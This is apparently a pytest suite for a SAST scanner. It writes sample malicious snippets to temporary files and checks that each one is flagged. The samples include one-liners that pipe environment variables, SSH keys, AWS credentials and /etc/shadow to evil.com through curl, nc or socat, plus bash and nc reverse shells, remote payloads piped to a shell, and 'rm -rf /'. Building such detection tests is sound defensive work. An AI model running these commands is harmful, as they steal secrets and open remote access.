"""Tests for scan_sast.py - SAST Vulnerability Scanner."""

import pytest
import scan_sast as scanner


class TestShellPipeExfiltration:
    """Tests for pipe chain exfiltration patterns in .sh files."""

    def test_env_piped_to_curl(self, tmp_path):
        sh = tmp_path / "evil.sh"
        sh.write_text("#!/bin/bash\nenv | curl -X POST -d @- http://evil.com/collect\n")
        findings = _scan_repo(tmp_path)
        assert any("env to network" in f.title for f in findings)

    def test_printenv_piped_to_wget(self, tmp_path):
        sh = tmp_path / "exfil.sh"
        sh.write_text("#!/bin/bash\nprintenv | wget --post-data=- http://evil.com\n")
        findings = _scan_repo(tmp_path)
        assert any("env to network" in f.title for f in findings)

    def test_cat_dotenv_piped_to_nc(self, tmp_path):
        sh = tmp_path / "leak.sh"
        sh.write_text("#!/bin/bash\ncat .env | nc evil.com 4444\n")
        findings = _scan_repo(tmp_path)
        assert any("env to network" in f.title for f in findings)

    def test_cat_ssh_piped_to_socat(self, tmp_path):
        sh = tmp_path / "steal.sh"
        sh.write_text("#!/bin/bash\ncat ~/.ssh | socat - TCP:evil.com:9999\n")
        findings = _scan_repo(tmp_path)
        assert any("env to network" in f.title for f in findings)

    def test_cat_aws_piped_to_curl(self, tmp_path):
        sh = tmp_path / "aws.sh"
        sh.write_text("#!/bin/bash\ncat ~/.aws | curl -d @- http://evil.com\n")
        findings = _scan_repo(tmp_path)
        assert any("env to network" in f.title for f in findings)


class TestSensitiveFilePipeExfiltration:
    """Tests for sensitive file to network pipe patterns."""

    def test_cat_credentials_piped_to_curl(self, tmp_path):
        sh = tmp_path / "creds.sh"
        sh.write_text("#!/bin/bash\ncat /home/user/credentials.json | curl -d @- http://evil.com\n")
        findings = _scan_repo(tmp_path)
        assert any("sensitive file to network" in f.title for f in findings)

    def test_cat_id_rsa_piped_to_wget(self, tmp_path):
        sh = tmp_path / "rsa.sh"
        sh.write_text("#!/bin/bash\ncat ~/.ssh/id_rsa | wget --post-data=- http://evil.com\n")
        findings = _scan_repo(tmp_path)
        assert any("sensitive file to network" in f.title for f in findings)

    def test_cat_shadow_piped_to_nc(self, tmp_path):
        sh = tmp_path / "shadow.sh"
        sh.write_text("#!/bin/bash\ncat /etc/shadow | nc evil.com 5555\n")
        findings = _scan_repo(tmp_path)
        assert any("sensitive file to network" in f.title for f in findings)

    def test_cat_gnupg_piped_to_ncat(self, tmp_path):
        sh = tmp_path / "gpg.sh"
        sh.write_text("#!/bin/bash\ncat ~/.gnupg/secring.gpg | ncat evil.com 6666\n")
        findings = _scan_repo(tmp_path)
        assert any("sensitive file to network" in f.title for f in findings)

    def test_cat_password_file_piped_to_curl(self, tmp_path):
        sh = tmp_path / "passwd.sh"
        sh.write_text("#!/bin/bash\ncat /opt/app/password.txt | curl -d @- http://evil.com\n")
        findings = _scan_repo(tmp_path)
        assert any("sensitive file to network" in f.title for f in findings)

    def test_cat_secret_file_piped_to_wget(self, tmp_path):
        sh = tmp_path / "secret.sh"
        sh.write_text("#!/bin/bash\ncat config/secret.yaml | wget --post-data=- http://evil.com\n")
        findings = _scan_repo(tmp_path)
        assert any("sensitive file to network" in f.title for f in findings)


class TestDevTcpRedirect:
    """Tests for /dev/tcp redirect patterns."""

    def test_redirect_to_dev_tcp(self, tmp_path):
        sh = tmp_path / "tcp.sh"
        sh.write_text("#!/bin/bash\necho $SECRET > /dev/tcp/evil.com/8080\n")
        findings = _scan_repo(tmp_path)
        assert any("Redirect to /dev/tcp" in f.title for f in findings)

    def test_redirect_with_spaces(self, tmp_path):
        sh = tmp_path / "tcp2.sh"
        sh.write_text("#!/bin/bash\ncat /etc/passwd >  /dev/tcp/10.0.0.1/443\n")
        findings = _scan_repo(tmp_path)
        assert any("Redirect to /dev/tcp" in f.title for f in findings)


class TestReverseShell:
    """Tests for reverse shell patterns."""

    def test_bash_reverse_shell(self, tmp_path):
        sh = tmp_path / "revshell.sh"
        sh.write_text("#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
        findings = _scan_repo(tmp_path)
        assert any("Reverse shell" in f.title for f in findings)

    def test_nc_exec_sh(self, tmp_path):
        sh = tmp_path / "nc_rev.sh"
        sh.write_text("#!/bin/bash\nnc -e /bin/sh evil.com 4444\n")
        findings = _scan_repo(tmp_path)
        assert any("Reverse shell" in f.title for f in findings)

    def test_nc_exec_bash(self, tmp_path):
        sh = tmp_path / "nc_bash.sh"
        sh.write_text("#!/bin/bash\nnc --exec /bin/bash evil.com 4444\n")
        findings = _scan_repo(tmp_path)
        assert any("Reverse shell" in f.title for f in findings)


class TestExistingShellPatterns:
    """Verify existing .sh patterns still work."""

    def test_eval_in_shell(self, tmp_path):
        sh = tmp_path / "eval.sh"
        sh.write_text("#!/bin/bash\neval $USER_INPUT\n")
        findings = _scan_repo(tmp_path)
        assert any("Eval in Shell" in f.title for f in findings)

    def test_curl_pipe_bash(self, tmp_path):
        sh = tmp_path / "install.sh"
        sh.write_text("#!/bin/bash\ncurl -s http://example.com/setup | bash\n")
        findings = _scan_repo(tmp_path)
        assert any("Curl Pipe Bash" in f.title for f in findings)


class TestPipeToShellInterpreter:
    """Tests for generic pipe-to-shell interpreter detection (issue #15)."""

    def test_echo_pipe_bash(self, tmp_path):
        sh = tmp_path / "evil.sh"
        sh.write_text('#!/bin/bash\necho "anything" | bash\n')
        findings = _scan_repo(tmp_path)
        assert any("Pipe to Shell Interpreter" in f.title for f in findings)

    def test_cat_pipe_sh(self, tmp_path):
        sh = tmp_path / "evil.sh"
        sh.write_text("#!/bin/bash\ncat payload.txt | sh\n")
        findings = _scan_repo(tmp_path)
        assert any("Pipe to Shell Interpreter" in f.title for f in findings)

    def test_wget_pipe_zsh(self, tmp_path):
        sh = tmp_path / "evil.sh"
        sh.write_text("#!/bin/bash\nwget -qO- http://evil.com/payload | zsh\n")
        findings = _scan_repo(tmp_path)
        assert any("Pipe to Shell Interpreter" in f.title for f in findings)

    def test_pipe_to_ksh(self, tmp_path):
        sh = tmp_path / "evil.sh"
        sh.write_text("#!/bin/bash\nprintf '%s' \"$cmd\" | ksh\n")
        findings = _scan_repo(tmp_path)
        assert any("Pipe to Shell Interpreter" in f.title for f in findings)

    def test_pipe_to_dash(self, tmp_path):
        sh = tmp_path / "evil.sh"
        sh.write_text("#!/bin/bash\necho 'rm -rf /' | dash\n")
        findings = _scan_repo(tmp_path)
        assert any("Pipe to Shell Interpreter" in f.title for f in findings)

    def test_pipe_to_shell_severity_is_critical(self, tmp_path):
        sh = tmp_path / "evil.sh"
        sh.write_text('#!/bin/bash\necho "payload" | bash\n')
        findings = _scan_repo(tmp_path)
        shell_findings = [f for f in findings if "Pipe to Shell Interpreter" in f.title]
        assert all(f.severity == "critical" for f in shell_findings)

    def test_pipe_to_shell_category(self, tmp_path):
        sh = tmp_path / "evil.sh"
        sh.write_text('#!/bin/bash\necho "payload" | bash\n')
        findings = _scan_repo(tmp_path)
        shell_findings = [f for f in findings if "Pipe to Shell Interpreter" in f.title]
        assert all(f.category == "shell-injection" for f in shell_findings)


class TestNestedCommandSubstitution:
    """Tests for nested command substitution detection (issue #15)."""

    def test_eval_nested_cat_find(self, tmp_path):
        sh = tmp_path / "evil.sh"
        sh.write_text('#!/bin/bash\neval "echo $(cat $(find / -name \'secret.txt\' 2>/dev/null))"\n')
        findings = _scan_repo(tmp_path)
        assert any("Nested Command Substitution" in f.title for f in findings)

    def test_result_nested_echo_whoami(self, tmp_path):
        sh = tmp_path / "evil.sh"
        sh.write_text("#!/bin/bash\nresult=$(echo $(whoami))\n")
        findings = _scan_repo(tmp_path)
        assert any("Nested Command Substitution" in f.title for f in findings)

    def test_deeply_nested_substitution(self, tmp_path):
        sh = tmp_path / "evil.sh"
        sh.write_text("#!/bin/bash\ndata=$(curl $(cat /tmp/url.txt))\n")
        findings = _scan_repo(tmp_path)
        assert any("Nested Command Substitution" in f.title for f in findings)

    def test_nested_substitution_severity_is_high(self, tmp_path):
        sh = tmp_path / "evil.sh"
        sh.write_text("#!/bin/bash\nresult=$(echo $(whoami))\n")
        findings = _scan_repo(tmp_path)
        nested = [f for f in findings if "Nested Command Substitution" in f.title]
        assert all(f.severity == "high" for f in nested)

    def test_nested_substitution_category(self, tmp_path):
        sh = tmp_path / "evil.sh"
        sh.write_text("#!/bin/bash\nresult=$(echo $(whoami))\n")
        findings = _scan_repo(tmp_path)
        nested = [f for f in findings if "Nested Command Substitution" in f.title]
        assert all(f.category == "code-execution" for f in nested)

    def test_single_substitution_not_flagged(self, tmp_path):
        sh = tmp_path / "safe.sh"
        sh.write_text("#!/bin/bash\nresult=$(date +%Y-%m-%d)\n")
        findings = _scan_repo(tmp_path)
        assert not any("Nested Command Substitution" in f.title for f in findings)


class TestNoFalsePositives:
    """Ensure clean shell scripts don't trigger exfiltration patterns."""

    def test_safe_env_usage(self, tmp_path):
        sh = tmp_path / "safe.sh"
        sh.write_text("#!/bin/bash\nenv | grep PATH\necho $HOME\n")
        findings = _scan_repo(tmp_path)
        exfil = [f for f in findings if f.category == "exfiltration"]
        assert len(exfil) == 0

    def test_safe_curl(self, tmp_path):
        sh = tmp_path / "download.sh"
        sh.write_text("#!/bin/bash\ncurl -o output.tar.gz http://example.com/release.tar.gz\n")
        findings = _scan_repo(tmp_path)
        exfil = [f for f in findings if f.category == "exfiltration"]
        assert len(exfil) == 0

    def test_safe_cat(self, tmp_path):
        sh = tmp_path / "read.sh"
        sh.write_text("#!/bin/bash\ncat README.md | head -10\n")
        findings = _scan_repo(tmp_path)
        exfil = [f for f in findings if f.category == "exfiltration"]
        assert len(exfil) == 0

    def test_safe_pipe_to_grep_not_shell(self, tmp_path):
        sh = tmp_path / "safe.sh"
        sh.write_text("#!/bin/bash\nps aux | grep nginx\nls -la | sort\n")
        findings = _scan_repo(tmp_path)
        assert not any("Pipe to Shell Interpreter" in f.title for f in findings)


class TestProcessEnvExposure:
    """Tests for process.env logging and serialization patterns."""

    def test_console_log_process_env(self, tmp_path):
        js = tmp_path / "debug.js"
        js.write_text("console.log(process.env)\n")
        findings = _scan_repo(tmp_path)
        assert any("process.env Logged" in f.title for f in findings)

    def test_console_error_process_env(self, tmp_path):
        js = tmp_path / "error.js"
        js.write_text("console.error(process.env)\n")
        findings = _scan_repo(tmp_path)
        assert any("process.env Logged" in f.title for f in findings)

    def test_json_stringify_process_env(self, tmp_path):
        js = tmp_path / "dump.js"
        js.write_text("const envStr = JSON.stringify(process.env)\n")
        findings = _scan_repo(tmp_path)
        assert any("JSON.stringify" in f.title for f in findings)

    def test_process_env_in_crash_report(self, tmp_path):
        js = tmp_path / "crash.js"
        js.write_text("fs.writeFileSync('crash.log', JSON.stringify(process.env))\n")
        findings = _scan_repo(tmp_path)
        assert any("Crash Report" in f.title or "process.env" in f.title for f in findings)

    def test_no_false_positive_single_env_var(self, tmp_path):
        js = tmp_path / "safe.js"
        js.write_text("console.log(process.env.NODE_ENV)\n")
        findings = _scan_repo(tmp_path)
        assert not any("process.env Logged" in f.title for f in findings)

    def test_typescript_process_env_logged(self, tmp_path):
        ts = tmp_path / "debug.ts"
        ts.write_text("console.log(process.env)\n")
        findings = _scan_repo(tmp_path)
        assert any("process.env Logged" in f.title for f in findings)

    def test_typescript_json_stringify(self, tmp_path):
        ts = tmp_path / "dump.ts"
        ts.write_text("JSON.stringify(process.env)\n")
        findings = _scan_repo(tmp_path)
        assert any("JSON.stringify" in f.title for f in findings)


class TestPathTraversal:
    """Tests for path traversal detection patterns."""

    def test_sendfile_with_req_path(self, tmp_path):
        js = tmp_path / "serve.js"
        js.write_text("app.get('/*', (req, res) => res.sendFile(req.path))\n")
        findings = _scan_repo(tmp_path)
        assert any("Path Traversal" in f.title for f in findings)

    def test_readfile_with_req_params(self, tmp_path):
        js = tmp_path / "read.js"
        js.write_text("fs.readFile(req.params.file, (err, data) => {})\n")
        findings = _scan_repo(tmp_path)
        assert any("Path Traversal" in f.title for f in findings)

    def test_path_join_with_req_query(self, tmp_path):
        js = tmp_path / "join.js"
        js.write_text("const p = path.join(__dirname, req.query.file)\n")
        findings = _scan_repo(tmp_path)
        assert any("Path Traversal" in f.title for f in findings)

    def test_proc_self_environ_access(self, tmp_path):
        js = tmp_path / "proc.js"
        js.write_text("fs.readFileSync('/proc/self/environ')\n")
        findings = _scan_repo(tmp_path)
        assert any("/proc" in f.title or "proc" in f.category for f in findings)

    def test_typescript_path_traversal(self, tmp_path):
        ts = tmp_path / "serve.ts"
        ts.write_text("const file = path.resolve(baseDir, req.params.name)\n")
        findings = _scan_repo(tmp_path)
        assert any("Path Traversal" in f.title for f in findings)

    def test_no_false_positive_static_path(self, tmp_path):
        js = tmp_path / "safe.js"
        js.write_text("const p = path.join(__dirname, 'public', 'index.html')\n")
        findings = _scan_repo(tmp_path)
        assert not any("Path Traversal" in f.title for f in findings)


class TestSeverityAndCategory:
    """Verify severity and category are set correctly on new patterns."""

    def test_all_exfil_patterns_are_critical(self, tmp_path):
        sh = tmp_path / "multi.sh"
        sh.write_text(
            "#!/bin/bash\n"
            "env | curl -d @- http://evil.com\n"
            "cat /etc/shadow | nc evil.com 5555\n"
            "echo x > /dev/tcp/evil.com/80\n"
            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
        )
        findings = _scan_repo(tmp_path)
        exfil = [f for f in findings if f.category == "exfiltration"]
        assert len(exfil) >= 4
        assert all(f.severity == "critical" for f in exfil)


class TestKernelExploitPatterns:
    """Tests for Linux AF_ALG kernel exploit detection patterns (CVE-2026-31431)."""

    def test_af_alg_socket_numeric(self, tmp_path):
        py = tmp_path / "exploit.py"
        py.write_text("import socket\na = socket.socket(38, 5, 0)\n")
        findings = _scan_repo(tmp_path)
        assert any("AF_ALG Socket" in f.title for f in findings)

    def test_af_alg_socket_hex(self, tmp_path):
        py = tmp_path / "exploit.py"
        py.write_text("import socket\na = socket.socket(0x26, 5, 0)\n")
        findings = _scan_repo(tmp_path)
        assert any("AF_ALG Socket" in f.title for f in findings)

    def test_af_alg_socket_constant(self, tmp_path):
        py = tmp_path / "exploit.py"
        py.write_text("import socket\na = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)\n")
        findings = _scan_repo(tmp_path)
        assert any("AF_ALG Socket" in f.title for f in findings)

    def test_af_alg_socket_bare_import(self, tmp_path):
        py = tmp_path / "exploit.py"
        py.write_text("from socket import *\ns = socket(AF_ALG, 5)\n")
        findings = _scan_repo(tmp_path)
        assert any("AF_ALG Socket" in f.title for f in findings)

    def test_af_alg_socket_single_arg(self, tmp_path):
        py = tmp_path / "exploit.py"
        py.write_text("import socket\na = socket.socket(socket.AF_ALG)\n")
        findings = _scan_repo(tmp_path)
        assert any("AF_ALG Socket" in f.title for f in findings)

    def test_aead_bind(self, tmp_path):
        py = tmp_path / "exploit.py"
        py.write_text('a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))\n')
        findings = _scan_repo(tmp_path)
        assert any("Crypto Template Bind" in f.title for f in findings)

    def test_skcipher_bind(self, tmp_path):
        py = tmp_path / "crypto.py"
        py.write_text("s.bind(('skcipher', 'cbc(aes)'))\n")
        findings = _scan_repo(tmp_path)
        assert any("Crypto Template Bind" in f.title for f in findings)

    def test_no_false_positive_hash_bind(self, tmp_path):
        py = tmp_path / "crypto.py"
        py.write_text("s.bind(('hash', 'sha256'))\n")
        findings = _scan_repo(tmp_path)
        kernel = [f for f in findings if f.category == "kernel-exploit"]
        assert len(kernel) == 0

    def test_authencesn_reference(self, tmp_path):
        py = tmp_path / "poc.py"
        py.write_text('template = "authencesn(hmac(sha256),cbc(aes))"\n')
        findings = _scan_repo(tmp_path)
        assert any("authencesn" in f.title for f in findings)

    def test_algif_aead_modprobe(self, tmp_path):
        sh = tmp_path / "setup.sh"
        sh.write_text("#!/bin/bash\nmodprobe algif_aead\n")
        findings = _scan_repo(tmp_path)
        assert any("algif_aead" in f.title for f in findings)

    def test_algif_aead_insmod(self, tmp_path):
        sh = tmp_path / "load.sh"
        sh.write_text("#!/bin/bash\ninsmod algif_aead\n")
        findings = _scan_repo(tmp_path)
        assert any("algif_aead" in f.title for f in findings)

    def test_algif_aead_insmod_full_path(self, tmp_path):
        sh = tmp_path / "load.sh"
        sh.write_text("#!/bin/bash\ninsmod /lib/modules/5.15.0/kernel/crypto/algif_aead.ko\n")
        findings = _scan_repo(tmp_path)
        assert any("algif_aead" in f.title for f in findings)

    def test_kernel_exploit_severity(self, tmp_path):
        py = tmp_path / "exploit.py"
        py.write_text(
            "import socket\n"
            "a = socket.socket(38, 5, 0)\n"
            'a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))\n'
        )
        findings = _scan_repo(tmp_path)
        kernel = [f for f in findings if f.category == "kernel-exploit"]
        assert len(kernel) == 3
        critical = [f for f in kernel if f.severity == "critical"]
        assert len(critical) == 2

    def test_no_false_positive_regular_socket(self, tmp_path):
        py = tmp_path / "server.py"
        py.write_text("import socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n")
        findings = _scan_repo(tmp_path)
        kernel = [f for f in findings if f.category == "kernel-exploit"]
        assert len(kernel) == 0

    def test_no_false_positive_bind_non_crypto(self, tmp_path):
        py = tmp_path / "server.py"
        py.write_text("s.bind(('0.0.0.0', 8080))\n")
        findings = _scan_repo(tmp_path)
        kernel = [f for f in findings if f.category == "kernel-exploit"]
        assert len(kernel) == 0


class TestReflectionRCE:
    """Tests for reflection-based RCE detection (Item 5)."""

    def test_java_method_invoke_variable(self, tmp_path):
        """Java Method.invoke with variable argument should flag."""
        java = tmp_path / "Evil.java"
        java.write_text(
            "public class Evil {\n"
            "    public void run(Object target, String methodName) throws Exception {\n"
            "        Method m = target.getClass().getMethod(methodName);\n"
            "        m.invoke(target);\n"
            "    }\n"
            "}\n"
        )
        findings = _scan_repo(tmp_path)
        assert any(f.category == "reflection-rce" for f in findings)

    def test_java_class_forname_variable(self, tmp_path):
        """Java Class.forName with variable should flag."""
        java = tmp_path / "Loader.java"
        java.write_text(
            "public class Loader {\n"
            "    public Object load(String className) throws Exception {\n"
            "        return Class.forName(className).newInstance();\n"
            "    }\n"
            "}\n"
        )
        findings = _scan_repo(tmp_path)
        assert any("Class.forName" in f.title for f in findings)

    def test_java_class_forname_literal_not_flagged(self, tmp_path):
        """Java Class.forName with string literal should NOT flag."""
        java = tmp_path / "Safe.java"
        java.write_text(
            'public class Safe {\n'
            '    public Object load() throws Exception {\n'
            '        return Class.forName("java.util.HashMap").newInstance();\n'
            '    }\n'
            '}\n'
        )
        findings = _scan_repo(tmp_path)
        forname = [f for f in findings if "Class.forName" in f.title]
        assert len(forname) == 0

    def test_go_reflect_valueof_variable(self, tmp_path):
        """Go reflect.ValueOf with variable should flag."""
        go_file = tmp_path / "evil.go"
        go_file.write_text(
            "package main\n"
            "import \"reflect\"\n"
            "func call(target interface{}) {\n"
            "    v := reflect.ValueOf(target)\n"
            "}\n"
        )
        findings = _scan_repo(tmp_path)
        assert any(f.category == "reflection-rce" for f in findings)

    def test_csharp_methodinfo_invoke(self, tmp_path):
        """C# MethodInfo.Invoke with variable should flag."""
        cs_file = tmp_path / "Evil.cs"
        cs_file.write_text(
            "using System.Reflection;\n"
            "public class Evil {\n"
            "    public void Run(object target) {\n"
            "        MethodInfo mi = target.GetType().GetMethod(methodName);\n"
            "        mi.Invoke(target, args);\n"
            "    }\n"
            "}\n"
        )
        findings = _scan_repo(tmp_path)
        assert any(f.category == "reflection-rce" for f in findings)

    def test_csharp_assembly_load(self, tmp_path):
        """C# Assembly.Load with variable should flag."""
        cs_file = tmp_path / "Loader.cs"
        cs_file.write_text(
            "using System.Reflection;\n"
            "public class Loader {\n"
            "    public void Load(byte[] assemblyBytes) {\n"
            "        Assembly.Load(assemblyBytes);\n"
            "    }\n"
            "}\n"
        )
        findings = _scan_repo(tmp_path)
        assert any("Assembly.Load" in f.title for f in findings)

    def test_csharp_activator_create_instance(self, tmp_path):
        """C# Activator.CreateInstance with variable should flag."""
        cs_file = tmp_path / "Factory.cs"
        cs_file.write_text(
            "using System;\n"
            "public class Factory {\n"
            "    public object Create(Type type) {\n"
            "        return Activator.CreateInstance(type);\n"
            "    }\n"
            "}\n"
        )
        findings = _scan_repo(tmp_path)
        assert any("Activator.CreateInstance" in f.title for f in findings)

    def test_ruby_send_with_variable(self, tmp_path):
        """Ruby send with variable argument should flag."""
        rb = tmp_path / "evil.rb"
        rb.write_text(
            "def dispatch(obj, method_name)\n"
            "  obj.send(method_name)\n"
            "end\n"
        )
        findings = _scan_repo(tmp_path)
        reflection = [f for f in findings if f.category == "reflection-rce"]
        assert len(reflection) > 0

    def test_ruby_public_send_with_variable(self, tmp_path):
        """Ruby public_send with variable argument should flag."""
        rb = tmp_path / "dispatch.rb"
        rb.write_text(
            "def safe_dispatch(obj, method_name)\n"
            "  obj.public_send(method_name)\n"
            "end\n"
        )
        findings = _scan_repo(tmp_path)
        reflection = [f for f in findings if f.category == "reflection-rce"]
        assert len(reflection) > 0

    def test_ruby_method_with_variable(self, tmp_path):
        """Ruby .method() with variable should flag."""
        rb = tmp_path / "meta.rb"
        rb.write_text(
            "def get_method(obj, name)\n"
            "  obj.method(name).call\n"
            "end\n"
        )
        findings = _scan_repo(tmp_path)
        reflection = [f for f in findings if f.category == "reflection-rce"]
        assert len(reflection) > 0

    def test_python_getattr_import_combo(self, tmp_path):
        """Python getattr(__import__(...)) combo should flag."""
        py = tmp_path / "evil.py"
        py.write_text("result = getattr(__import__('os'), 'system')('whoami')\n")
        findings = _scan_repo(tmp_path)
        reflection = [f for f in findings if f.category == "reflection-rce"]
        assert len(reflection) > 0


def _scan_repo(repo_path):
    import forensics_core as core
    findings = []
    for fp, rp in core.walk_repo(str(repo_path)):
        findings.extend(scanner.scan_file(fp, rp))
    return findings
